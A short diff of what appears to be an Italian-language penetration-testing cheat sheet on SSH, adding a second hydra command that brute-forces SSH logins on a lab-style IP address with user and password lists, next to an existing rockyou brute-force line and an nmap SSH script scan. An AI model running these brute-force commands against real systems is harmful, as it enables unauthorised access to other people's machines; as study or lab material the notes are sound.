@@ -42,6 +42,7 @@ sudo nmap -sV -p22 --script ssh* <IP>                 # Script NSE SSH
 
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+hydra -L user.list -P password.list ssh://10.129.42.197
 ```
 
 ### CHIAVI SSH
